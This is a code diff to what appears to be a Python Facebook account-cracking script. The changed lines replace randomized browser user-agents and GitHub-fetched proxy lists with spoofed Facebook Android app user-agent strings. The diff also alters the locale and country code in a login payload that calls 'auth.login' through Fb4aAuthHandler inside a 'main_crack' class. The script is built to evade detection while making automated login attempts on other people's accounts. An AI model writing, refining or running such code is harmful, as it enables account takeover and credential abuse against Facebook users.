@@ -271,108 +271,22 @@ srange = 0
 saved = []
 totaldmp = 0
 filter = []
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-try:
-	prox= requests.get('https://github.com/RJSHANTO-217/Api/blob/main/prox.txt').text
-	open('.prox.txt','w').write(prox)
-	
-except Exception as e:
-	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mSHANTO')
-prox=open('.prox.txt','r').read().splitlines()
-for xd in range(1000):
-	a='Mozilla/5.0 (Symbian/3; Series60/'
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Nokia'
-	e=random.randrange(1000, 9999)
-	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mobile Safari/535.1'
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen2.append(uaku)
- 
-for agent in range(random.randint(89999, 100000)):
-    a='Mozilla/5.0 (iPod/'
-    aa=random.choice(['7.1','8.0','9.2','10.3','11.4','12.5','13.2','14.7','15.1','16.0'])
-    a1='; CPU iPhone OS'
-    b=random.choice(['3_1','3_2','3_3','16_5','13_4','3_0','4_0','15_0','11_0','12_1','13_3','14_2'])
-    n='like Mac OS X)'
-    c=random.randrange(7,12)
-    m='en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(100,999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/'
-    o=random.randrange(533,605)
-    p='1'
-    q=random.randrange(10,99)
-    r='(KHTML, like Gecko) Chrome/'
-    h=random.randrange(10,99)
-    i='0'
-    j=random.randrange(1000,9999)
-    k=random.randrange(10,99)
-    l='GSA/'
-    ll=random.randrange(155,159)
-    l1=random.randrange(1,9)
-    l2=random.randrange(111111111,999999999)
-    l3='Mobile/'
-    l4=random.choice(['18C79','18B92','18A374','17D47','16E23','15F91','14G60','13H15','12I82','11J33','10K04','09L78'])
-    l5='Safari/'
-    s=random.randrange(535,605)
-    t=random.randrange(1,9)
-    fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
-    ugen.append(fullagent)
-   
-def uaku():
-	try:
-		ua=open('bbnew.txt','r').read().splitlines()
-		for ub in ua:
-			ugen.append(ub)
-	except:
-		a=requests.get('https://github.com/SADIM-143/Ua.txt').text
-		ua=open('.bbnew.txt','w')
-		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
-id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
-cokbrut=[]
- 
-def back():
-	login()
-RIFAT="RIFAT"
-imt="SETU"
-ak="CLASS3-"
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = 'Mozilla/5.0 (Linux; Android 10; Infinix X690B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36'
+    END = '[FBAN/FB4A;FBAV/76.0.0.7677;FBBV/5559051;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
 def randFBAN():
   VAPP = random.randint(410000000,499999999)
-  ua="Mozilla/5.0 (Linux; Android 10; SM-A207F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]"
+  ua="[FBAN/FB4A;FBAV/68.0.0.3593;FBBV/"+str(VAPP)+";FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/16;FBOP/5;FBCA/arm64-v8a:;]"
   return ua
 
 def randBuildvsskj():
-    END = 'Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/356.0.0.28.112;]'
+    END = '[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/DANGER2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
-  
-  # Generate random iOS version and build
-ios_version = f"{random.randint(10, 15)}_{random.randint(0, 9)}_{random.randint(0, 9)}"
-ios_build = f"Mobile/{random.randint(10000, 19999)}"
-
-# Create the randomized User-Agent string
-custom_ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{ios_version} {ios_build} Safari/605.1.15"
 
 sys.stdout.write('\x1b]2; DANGER\x07')
 S = '\033[1;37m'
@@ -504,8 +418,8 @@ class main_crack():
 "meta_inf_fbmeta": "",
 "advertiser_id": str(uuid.uuid4()),
 "currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
+"locale": "fr_IN",
+"client_country_code": "NP",
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
